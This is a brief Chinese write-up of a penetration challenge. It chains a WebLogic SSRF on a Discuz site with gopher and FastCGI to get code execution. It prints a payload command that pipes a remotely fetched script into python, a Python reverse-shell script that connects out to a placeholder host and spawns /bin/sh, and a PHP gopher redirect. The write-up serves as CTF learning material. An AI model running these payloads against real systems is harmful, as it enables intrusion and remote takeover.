一个很有意思的渗透题：

打开链接是一个Dz的站，然后当天rr发过一篇关于利用gopher进行任意代码攻击的文章传送门：
而这个漏洞的利用首先是需要一个ssrf漏洞，而环境的DZ不存在ssrf，既然是渗透，那么当然是扫目录，很快就发现有phpinfo以及发现了一个console的目录，访问了下，发现是一个Weblogic的页面：

百度了下，发现这个weblogic存在一个ssrf漏洞，基本一样传送门：

当然，因为三个白帽的环境是docker，所以这里的ssrf其实就127.0.0.1。这里的利用方式很多，我用了fastcgi去进行reverseshell，参考文章。于是思路很明确了：
本地监听端口：

nv -lvv 9000>1.txt

脚本执行生成payload：
为什么不用bash= =因为这里bash是个坑，所以用py去反弹shell

./fcgi_exp system 127.0.0.1 9000 /opt/discuz/info.php "curl ip/302.py|python"

然后将1.txt的内容url编码，+号用%20去替换：

<?php
    $a = str_replace("+", "%20", urlencode(file_get_contents("1.txt")));
    echo $a;
?>

然后在自己的vps上放一个py以及php：

import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("yourip",9999))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(["/bin/sh","-i"]);

<?php header('Location: gopher://127.0.0.1:9000/_$a');?>
